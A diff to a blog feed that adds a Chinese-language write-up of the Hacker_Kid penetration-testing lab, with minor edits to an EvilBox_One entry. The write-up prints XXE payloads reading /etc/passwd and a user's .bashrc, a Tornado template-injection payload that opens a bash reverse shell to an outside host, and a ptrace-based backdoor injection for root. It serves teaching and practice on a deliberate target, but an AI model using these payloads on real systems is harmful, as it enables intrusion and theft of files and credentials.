@@ -8,6 +8,198 @@
 ]]></content>
   </entry>
   <entry>
+    <title>Hacker_Kid</title>
+    <url>/2022/12/01/Hacker-Kid/</url>
+    <content><![CDATA[<p><strong>0x01 主机发现</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/12/01/Hacker-Kid/01.png" class title="This is an example image">
+
+
+
+<p><strong>0x02 端口扫描</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 10.0.2.10</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/12/01/Hacker-Kid/02.png" class title="This is an example image">
+
+
+
+<p><strong>0x03 服务识别</strong></p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p53,80,9999 -sV 10.0.2.10</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/12/01/Hacker-Kid/03.png" class title="This is an example image">
+
+<p>可以看到53端口开放的服务是 domain，版本是BIND 9，这是一款DNS服务器，就是用来把域名解析到IP的。默认是开启53端口的TCP(用于同步记录)和UDP(用于解析域名)的，探测下UDP是否开启。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p53 -sU 10.0.2.10</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/12/01/Hacker-Kid/04.png" class title="This is an example image">
+
+
+
+<p><strong>0x04 Web页面探测</strong></p>
+<p>访问开放的web服务</p>
+<img src="/2022/12/01/Hacker-Kid/05.png" class title="This is an example image">
+
+
+
+<p>各个标签点击后并无响应请求，右键查看源代码看到有注释的信息。</p>
+<img src="/2022/12/01/Hacker-Kid/06.png" class title="This is an example image">
+
+
+
+<p>提示我们用 GET 请求参数 page_no 去访问页面，但参数值范围不清楚，拿bp爆破下试试。</p>
+<img src="/2022/12/01/Hacker-Kid/07.png" class title="This is an example image">
+
+
+
+<p>可以看到 page_no 为21时响应不同，访问试试</p>
+<img src="/2022/12/01/Hacker-Kid/08.png" class title="This is an example image">
+
+
+
+<p>页面下面多了一行红色小字，提示有子域名存在后门漏洞，例如 hackers.blackhat.local 。那就先添加下本地域名解析。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /etc/hosts</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">添加内容如下</span></span><br><span class="line">10.0.2.10 blackhat.local</span><br><span class="line">10.0.2.10 hackers.blackhat.local</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>0x05 DNS区域传输</strong></p>
+<p>访问 hackers.blackhat.local 试试</p>
+<img src="/2022/12/01/Hacker-Kid/09.png" class title="This is an example image">
+
+
+
+<p>提示信息一直说 DIG me more。补充下，DIG工具是Linux上用于查询DNS解析记录的，而刚才服务识别也发现了 53 端口开放着 DNS 服务器，那就来 DIG 一下吧。</p>
+<img src="/2022/12/01/Hacker-Kid/10.png" class title="This is an example image">
+
+
+
+<p>可以看到查询到了更多的域名解析记录，把相关子域名都加入hosts文件解析。</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vi /etc/hosts</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">添加内容如下</span></span><br><span class="line">10.0.2.10       hackers.blackhat.local</span><br><span class="line">10.0.2.10       blackhat.local</span><br><span class="line">10.0.2.10       hackerkid.blackhat.local</span><br><span class="line">10.0.2.10       ns1.blackhat.local</span><br><span class="line">10.0.2.10       mail.blackhat.local</span><br><span class="line">10.0.2.10       hacker.blackhat.local.blackhat.local</span><br></pre></td></tr></table></figure>
+
+
+
+<p>前面扫描端口时开放了 80 和 9999 端口，那就对新增的这几个子域名逐个访问，发现了一个登录页，一个注册页，但显然不是同一个功能。</p>
+<img src="/2022/12/01/Hacker-Kid/11.png" class title="This is an example image">
+
+<img src="/2022/12/01/Hacker-Kid/12.png" class title="This is an example image">
+
+
+
+<p><strong>0x06 XXE注入攻击 &amp; PHP封装器</strong></p>
+<p>现在我们啥没有，直接注册试试。发现响应信息有这么个特点，无论输入什么，都提示<strong>邮箱不合法</strong>，并把<strong>邮箱信息打印</strong>出来。而且数据传输格式是 xml。这就想起了 XXE 漏洞，猜测后台就是解析用户 xml 信息并打印邮箱信息。</p>
+<img src="/2022/12/01/Hacker-Kid/13.png" class title="This is an example image">
+
+
+
+<p>XXE 测试，注入点是邮箱信息</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [<span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;file:///etc/passwd&#x27;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">email</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2022/12/01/Hacker-Kid/14.png" class title="This is an example image">
+
+
+
+<p>可以看到有个 saket 用户有 bash权限，那就尝试用 XXE 读取 saket 相关的文件。尝试读取默认的<strong>SSH公私钥文件</strong>（.ssh&#x2F;authorized_keys），无果。多番尝试后读取了目录下的 .bashrc 文件，读取过程中需要 <strong>base64 编码</strong>将文件信息带出，可能是系统默认识别为执行代码，编码带出则为文本。</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> [<span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&#x27;php://filter/convert.base64-encode/resource=/home/saket/.bashrc&#x27;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">	<span class="tag">&lt;<span class="name">email</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2022/12/01/Hacker-Kid/15.png" class title="This is an example image">
+
+
+
+<p><strong>0x07 SSTI模板注入</strong></p>
+<p>解码后的文件中有个账号密码，还记得我们之前有个登录页面吗，尝试登录，失败！！！</p>
+<img src="/2022/12/01/Hacker-Kid/16.png" class title="This is an example image">
+
+
+
+<p>观察了一下，这密码是 <strong>Saket!#$%@!!</strong> ，那对应的账号会不会是 saket 而不是 admin，成功登录！！！</p>
+<img src="/2022/12/01/Hacker-Kid/17.png" class title="This is an example image">
+
+
+
+<p>看到登录后的页面通过获取 GET 传入的 name 参数，直接显示在页面上，会不会存在 <strong>SSTI 模板注入</strong>漏洞。现在各种开发语言如：JAVA(velocity 模板等)、PHP(Smarty 模板等)、Python(Tornado 模板等)，都存在后端进行前端模板渲染，这期间如果没做过滤，就可能存在对应模板的任意表达式执行。</p>
+<p>根据前面 nmap 服务识别可知，服务端用的是 <strong>Tornado</strong> 模板，先尝试用通用渲染方式探测是否存在漏洞</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;&#123;1+abcxyz&#125;&#125;$&#123;1+abcxyz&#125;%3C%1+abcxyz%%3E[abcxyz]</span><br></pre></td></tr></table></figure>
+
+
+
+<p>看到报错，说明确实解析到了，存在漏洞</p>
+<img src="/2022/12/01/Hacker-Kid/18.png" class title="This is an example image">
+
+
+
+<p>测试解析占位符格式，哪种形式的参数被解析</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$&#123;7*7&#125;,&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<img src="/2022/12/01/Hacker-Kid/19.png" class title="This is an example image">
+
+
+
+<p>可以看到第二种解析形式被成功解析，则注入表达式要在两重括号内。表达式的敏感字符默认会被过滤，需要对 **{ %**，做URL编码，详细编码如下：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">&#123;% import os %&#125;&#123;&#123;os.system(&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/10.0.2.4/4444 0&gt;&amp;1&quot;&#x27;)&#125;&#125;  #表达式内容作编码</span><br></pre></td></tr></table></figure>
+
+<p>把需要被表达式解析的{}、()、%、空格、’’、””全部做 url 编码，相关参数的 . 符号就不用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">%7b%25%20import%20os%20%25%7d%7b%7bos.system%28%27bash%20-c%20%22bash%20-i%20%3e%26 %2fdev%2ftcp%2f10.0.2.4%2f4444%200%3e%261%22%27%29%7d%7d</span><br></pre></td></tr></table></figure>
+
+
+
+<p>拿到了 saket 账户的 shell，还需要一波提权。</p>
+<img src="/2022/12/01/Hacker-Kid/20.png" class title="This is an example image">
+
+
+
+<p><strong>0x08 Capabilitie提权</strong></p>
+<p>把寻常的提权方式试一遍：</p>
+<ol>
+<li>unam -a 内核提权</li>
+<li>sudo -l  查看是否有 sudo 权限配置不当</li>
+<li>是否有 suid、sgid 设置不当的文件</li>
+</ol>
+<p>都没有找到，实在头大。秉着绝大多数提权都是权限相关的操作管理不当，继续找权限配置相关的操作，想到了 Capabilitie 这个 Linux下的权限管理机制。</p>
+<p>Capabilitie 是从Linux 内核2.2开始引入的，简单来说就是更细致的权限划分，比如 Wireshark 抓包，并非赋予整个程序抓取底包的权限，而是单独把抓取网络原始数据的能力赋予 Wireshark 进程。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">setcap</span> cap_net_raw,cap_net_admim=eip /usr/bin/dumpcap  <span class="comment">#赋予 cap_net_raw、cap_net_admim能力</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#详细可参考：https://man7.org/linux/man-pages/man7/capabilities.7.html</span><br></pre></td></tr></table></figure>
+
+
+
+<p>秉着这个思路，看是否有 Capabilitie 配置不当的权限。查看当前 Capabilitie 配置</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/sbin/getcap -r / 2&gt;/dev/null <span class="comment">#递归查询</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2022/12/01/Hacker-Kid/21.png" class title="This is an example image">
+
+
+
+<p>可以看到 python2 有  cap_sys_ptrace+ep 权限点，这个是一个调试程序相关的权限，这种涉及底层的权限大多是高权限，则可以利用 python2 的注入来实现提权。先查看以 root 运行的程序：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ps -U root  <span class="comment">#随便选个 root 程序，这里选了apache服务，线程号801</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2022/12/01/Hacker-Kid/22.png" class title="This is an example image">
+
+
+
+<p>注入脚本 inject.py，参考如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.cnblogs.com/zlgxzswjy/p/15185591.html</span><br></pre></td></tr></table></figure>
+
+
+
+<p>执行注入脚本，会把后门注入到801这个服务中，然后默认开启5600服务，以供远程连接：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python2<span class="number">.7</span> inject.py <span class="number">801</span>   <span class="comment">#注入后门</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2022/12/01/Hacker-Kid/23.png" class title="This is an example image">
+
+
+
+<p>远程连接后门：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc 10.0.2.10 5600  <span class="comment">#远程连接</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2022/12/01/Hacker-Kid/24.png" class title="This is an example image">]]></content>
+      <categories>
+        <category>红队</category>
+      </categories>
+      <tags>
+        <tag>打靶</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>EvilBox_One</title>
     <url>/2022/11/23/EvilBox-One/</url>
     <content><![CDATA[<p><strong>0x01 主机发现</strong></p>
@@ -173,7 +365,7 @@
 
 
 <p>可看到当前用户对 &#x2F;etc&#x2F;passwd 居然有读写权限。&#x2F;etc&#x2F;passwd文件只存在账号列表及对应的权限，对应的密码文件存储在 &#x2F;etc&#x2F;shadow 文件，只有 root 能读写。但如果能直接修改 &#x2F;etc&#x2F;passwd文件，就可以直接覆盖 root 密码</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openssl passwd -1</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">openssl passwd -1 #生成加密密码</span><br></pre></td></tr></table></figure>
 
 <img src="/2022/11/23/EvilBox-One/23.png" class title="This is an example image">
 
@@ -184,6 +376,9 @@
       <categories>
         <category>红队</category>
       </categories>
+      <tags>
+        <tag>打靶</tag>
+      </tags>
   </entry>
   <entry>
     <title>Hard_socnet2</title>
